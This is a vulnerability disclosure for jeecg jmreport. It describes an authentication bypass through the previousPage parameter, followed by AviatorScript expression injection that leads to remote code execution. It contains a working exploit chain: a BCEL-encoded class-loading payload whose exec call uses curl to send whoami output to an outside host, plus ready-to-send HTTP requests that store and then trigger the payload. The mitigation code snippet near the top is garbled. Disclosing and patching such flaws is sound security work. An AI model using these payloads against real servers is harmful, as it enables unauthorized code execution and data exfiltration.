# jeecg jmreport Unauthorized AviatorEvaluator Leads to RCE Vulnerability

reporter: root012,

## Vulnerability Analysis:

Cause of Unauthorized Privilege Escalation:

The issue arises from a flaw in the JimuReportTokenInterceptor class within the jmreport component of Jeecg, where there is an error in the authentication logic. The validation of the token's validity is performed after checking the `previousPage` parameter to determine if it should be returned. If the `previousPage` parameter is directly provided, it leads to bypassing the token check, thereby allowing unauthorized privilege escalation.

![image-20240815214735901](file://C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240815214735901.png?lastModify=1723735370)

The next step involves checking the `previousPage` parameter

![image-20240815214826809](file://C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240815214826809.png?lastModify=1723735381)



When the `previousPage` parameter is passed, the identity check immediately returns `true`, thereby bypassing the token validation. This allows an attacker to circumvent the intended security checks by simply providing a `previousPage` parameter.





Reason for Command Execution (RCE):

In Jeecg, the `ExpressUtil` class uses `AviatorEvaluator` to execute expressions directly without configuring any security policies. This lack of security measures leads to a potential AviatorScript injection vulnerability, where an attacker can execute arbitrary static methods by default.

![image-20240815215220727](file://C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240815215220727.png?lastModify=1723735395)

![image-20240815215430223](file://C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240815215430223.png?lastModify=1723735409)

Recommendations for Vendors to Address the Issue:

https://github.com/apache/hertzbeat/commit/8dcf050e27ca95d15460a7ba98a3df8a9cd1d3d2



```


​```
 AviatorEvaluatorInstance instance = AviatorEvaluator.getInstance();
        // 配置AviatorEvaluator使用LRU缓存编译后的表达式
        instance
                .useLRUExpressionCache(AVIATOR_LRU_CACHE_SIZE)
                .addFunction(new StrEqualFunction());

        // 配置Aviator语法特性集合
        instance.setOption(Options.FEATURE_SET,
                Feature.asSet(Feature.If,
                        Feature.Assignment,
                        Feature.Let,
                        Feature.StringInterpolation));

        // 配置自定义aviator函数
        instance.addOpFunction(OperatorType.BIT_OR, new AbstractFunction() {
            @Override
            public AviatorObject call(final Map<String, Object> env, final AviatorObject arg1,
                                      final AviatorObject arg2) {
           public String getName() {
            }
        });

        instance.addFunction(new StrContainsFunction());
        instance.addFunction(new ObjectExistsFunction());
        instance.addFunction(new StrMatchesFunction());
​```
```



## Vulnerability Demonstration: 

Writing to a Table via Unauthenticated Access

To demonstrate the vulnerability, I will use `curl` with additional data to exploit the unauthenticated access and write to a table. Here’s how it can be done:

payload：

```
=((c=(Class.forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a\_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6\_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e\_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d\_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$\_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A',true,new com.sun.org.apache.bcel.internal.util.ClassLoader()))) + ( c.exec('curl http://ip.port.xxx.xxx.io/`whoami`')))
```



```
POST /jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: x.x.x.x:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 3456
 
 
{
    "loopBlockList": [],
    "area": false,
    "printElWidth": 718,
    "excel_config_id": "980882669965455363",
    "printElHeight": 1047,
    "rows": {
        "4": {
            "cells": {
                "4": {
                    "text": "=((c=(Class.forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a\_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6\_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e\_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d\_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$\_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A',true,new com.sun.org.apache.bcel.internal.util.ClassLoader()))) + ( c.exec('curl http://ip.port.xxx.xxx.io/`whoami`')))",
                    "style": 0
                }
            },
            "height": 25
        },
        "len": 96,
        "-1": {
            "cells": {
                "-1": {
                    "text": "${gongsi.id}"
                }
            },
            "isDrag": true
        }
    },
    "dbexps": [],
    "toolPrintSizeObj": {
        "printType": "A4",
        "widthPx": 718,
        "heightPx": 1047
    },
    "dicts": [],
    "freeze": "A1",
    "dataRectWidth": 701,
    "background": false,
    "name": "sheet1",
    "autofilter": {},
    "styles": [
        {
            "align": "center"
        }
    ],
    "validations": [],
    "cols": {
        "4": {
            "width": 95
        },
        "len": 50
    },
    "merges": [
        "E4:F4",
        "B4:B5",
        "C4:C5",
        "D4:D5",
        "G4:G5",
        "H4:H5",
        "I4:I5",
        "D1:G1",
        "H3:I3"
    ]
}
```



Afterward, through unauthenticated access to the table, trigger the AviatorScript code execution vulnerability.

```
POST /jeecg-boot/jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
Host: x.x.x.x:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 42
 
 
{
    "id": "980882669965455363"
}
```

